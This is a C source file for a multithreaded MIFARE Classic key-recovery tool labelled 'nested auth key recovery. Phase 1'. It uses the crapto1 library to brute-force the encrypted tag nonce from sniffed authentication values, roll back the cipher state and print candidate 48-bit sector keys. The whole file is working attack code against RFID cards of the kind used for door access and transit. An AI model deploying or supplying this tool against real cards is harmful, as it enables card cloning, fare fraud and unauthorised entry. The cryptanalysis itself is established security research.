#define __STDC_FORMAT_MACROS
#include <inttypes.h>
#include <stdio.h>
#include<string.h>
#include<pthread.h>
#include<stdlib.h>
#include<unistd.h>
#include "sleep.h"
#include "crapto1.h"
#include "protocol.h"
#include "iso14443crc.h"

#define llx PRIx64
#define lli PRIi64
#define odd_parity(i) (( (i) ^ (i)>>1 ^ (i)>>2 ^ (i)>>3 ^ (i)>>4 ^ (i)>>5 ^ (i)>>6 ^ (i)>>7 ^ 1) & 0x01)

// a global mutex to prevent interlaced printing from different threads
pthread_mutex_t print_lock;

//////////////////// define options here
uint32_t uid = 0x0;     // serial number
uint32_t nr_enc = 0x0;  // encrypted reader challenge
uint32_t ar_enc = 0x0;  // encrypted reader response
uint32_t at_enc = 0x0;  // encrypted tag response
uint32_t enc_4 =   0x0; // next encrypted command to sector
uint32_t nt_enc = 0x0; // Encrypted tag nonce
int nt_enc_parity[3] = {0,0,0}; // 3 first parity bit of nt_enc, !(wrong parity)=0
////////////////////

uint8_t cmds[] = { ISO14443A_CMD_READBLOCK, ISO14443A_CMD_WRITEBLOCK,
  MIFARE_AUTH_KEYA, MIFARE_AUTH_KEYB, MIFARE_CMD_INC,
  MIFARE_CMD_DEC, MIFARE_CMD_RESTORE, MIFARE_CMD_TRANSFER };

int global_counter = 0;
int global_fin_flag = 0;
size_t thread_count = 8;

// Return 1 if the nonce is invalid else return 0
int valid_nonce(uint32_t Nt, uint32_t NtEnc, uint32_t Ks1, int * parity) {
        return ((odd_parity((Nt >> 24) & 0xFF) == ((parity[0]) ^ odd_parity((NtEnc >> 24) & 0xFF) ^ BIT(Ks1,16))) & \
        (odd_parity((Nt >> 16) & 0xFF) == ((parity[1]) ^ odd_parity((NtEnc >> 16) & 0xFF) ^ BIT(Ks1,8))) & \
        (odd_parity((Nt >> 8) & 0xFF) == ((parity[2]) ^ odd_parity((NtEnc >> 8) & 0xFF) ^ BIT(Ks1,0)))) ? 1 : 0;
}

void* brute_thread(void *arg) {
	
	int shift = (int)arg;

        struct Crypto1State *revstate;
        uint64_t key;     // recovered key candidate
        uint32_t ks1;     // keystream used to encrypt tag nonce
        uint32_t ks2;     // keystream used to encrypt reader response
        uint32_t ks3;     // keystream used to encrypt tag response
        uint32_t ks4;     // keystream used to encrypt next command
        uint32_t nt;      // current tag nonce

	uint32_t p64 = 0;
	
	for (nt = shift; nt < 0xFFFF; nt += thread_count) {
		
                if(nt_enc){
                        ks1 = nt ^ nt_enc;
                        if (valid_nonce(nt, nt_enc, ks1, nt_enc_parity) == 1){
				__sync_fetch_and_add(&global_counter, 1);
                                continue;
                        }
                }

		p64 = prng_successor(nt, 64);
		ks2 = ar_enc ^ p64;
		ks3 = at_enc ^ prng_successor(p64, 32);
                revstate = lfsr_recovery64(ks2, ks3);
                ks4 = crypto1_word(revstate,0,0);

		if (ks4 != 0) {
			
			// lock this section to avoid interlacing prints from different threats
			pthread_mutex_lock(&print_lock);
	
			printf("\n**** Possible key candidate ****\n");
                        printf("thread #%d\n",shift);
			printf("current nt(%08x)  ar_enc(%08x)  at_enc(%08x)\n", nt, ar_enc, at_enc);
                        printf("ks2:%08x\n", ks2);
                        printf("ks3:%08x\n", ks3);
                        printf("ks4:%08x\n", ks4);


                        if(enc_4){
				
				uint32_t decrypted = ks4 ^ enc_4;
				printf("CMD enc(%08x)\n", enc_4);
				printf("    dec(%08x)\t", decrypted );
				
				uint8_t cmd = (decrypted >> 24) & 0xFF;
				uint8_t isOK = 0;
				// check if cmd exists
				for (int i = 0; i < sizeof(cmds); ++i){
					if ( cmd == cmds[i] ) {							
						isOK = 1;
						break;
					}
				}
				// Add a crc-check.
				uint8_t data[] = { 
					(decrypted >> 24) & 0xFF,
					(decrypted >> 16) & 0xFF,
					(decrypted >> 8)  & 0xFF,
					decrypted & 0xFF
				};
				isOK = CheckCrc14443(CRC_14443_A, data, sizeof(data));

				if ( !isOK) {
					printf("<-- not a valid cmd\n");
					pthread_mutex_unlock(&print_lock);  
					free(revstate);
					__sync_fetch_and_add(&global_counter, 1);					
					continue;
				} else {
					printf("<-- Valid cmd\n");
				}
			}
			
			lfsr_rollback_word(revstate, 0, 0);
                        lfsr_rollback_word(revstate, 0, 0);
                        lfsr_rollback_word(revstate, 0, 0);
                        lfsr_rollback_word(revstate, nr_enc, 1);
                        lfsr_rollback_word(revstate, uid ^ nt, 0);
                        crypto1_get_lfsr(revstate, &key);
                        printf("\nKey candidate: [%012"llx"]\n\n",key);
			
			//release lock
			pthread_mutex_unlock(&print_lock);  
		}
		
        free(revstate);
		__sync_fetch_and_add(&global_counter, 1);
	}

	__sync_fetch_and_add(&global_fin_flag, 1);
	printf("***\nthread #%d finished\nfin_flag:\t%d\n", shift, global_fin_flag);
	return NULL; 
}

int main (int argc, char *argv[]) {
printf("Mifare classic nested auth key recovery. Phase 1.\n");
  if (argc < 5) {
    printf(" syntax: %s <uid> <{nr}> <{ar}> <{at}> [<{next command}> <{nt}> <ntparity1> <ntparity2> <ntparity3>]\n\n",argv[0]);
    printf("   {} = encrypted, ntparity1 : 0 if ! (parity mistmatch), 1 otherwise\n");
    return 1;
  }

sscanf(argv[1],"%x",&uid);
sscanf(argv[2],"%x",&nr_enc);
sscanf(argv[3],"%x",&ar_enc);
sscanf(argv[4],"%x",&at_enc);
if (argc > 5) {
sscanf(argv[5],"%x",&enc_4);
}
if (argc > 6) {
sscanf(argv[6],"%x",&nt_enc);
}
if (argc > 9) {
sscanf(argv[7],"%d",&nt_enc_parity[0]);
sscanf(argv[8],"%d",&nt_enc_parity[1]);
sscanf(argv[9],"%d",&nt_enc_parity[2]);
}

printf("UID:\t\t%08x\n", uid);
printf("Rdr nonce:\t%08x\n", nr_enc);
printf("Rdr answer:\t%08x\n", ar_enc);
printf("Tag answer:\t%08x\n", at_enc);
	
if (enc_4)
        printf("Next cmd:\t%08x\n", enc_4);
else
        printf("Next cmd not defined\n");

	if (nt_enc)
        printf("Tag encrypted nonce:\t%08x\n", nt_enc);
	
	if (argc > 9)
        printf("Parity bit of nt_enc : %d %d %d", nt_enc_parity[0], nt_enc_parity[1], nt_enc_parity[2]);

printf("\nNow let's try to bruteforce encrypted tag nonce last bytes\n\n");

#ifndef __WIN32
        thread_count = sysconf(_SC_NPROCESSORS_CONF);
		if ( thread_count < 1)
			thread_count = 1;
#endif  /* _WIN32 */
	
	printf("Threads : %d\n", thread_count);
	pthread_t threads[thread_count];

	// create a mutex to avoid interlacing print commands from our different threads
	pthread_mutex_init(&print_lock, NULL);
	
	for (int i = 0 ; i < thread_count; ++i)
		pthread_create(&threads[i], NULL, brute_thread,(void*)i);

	// wait for threads to terminate:
	for (int i = 0; i < thread_count; ++i)
		pthread_join(threads[i], NULL);
	// clock_t t1 = clock();
	// while( global_fin_flag != THREADS ) {

		// if ( global_counter % 8 ) {
			// t1 = clock() - t1;
			// printf("Checked %0.2f %% \t %.0f ticks\r", (float)global_counter * 0.001525902,  (float)t1 );
			// fflush(stdout);
		// }
	// }

	// clean up mutex
	pthread_mutex_destroy(&print_lock);

  return 0;
}
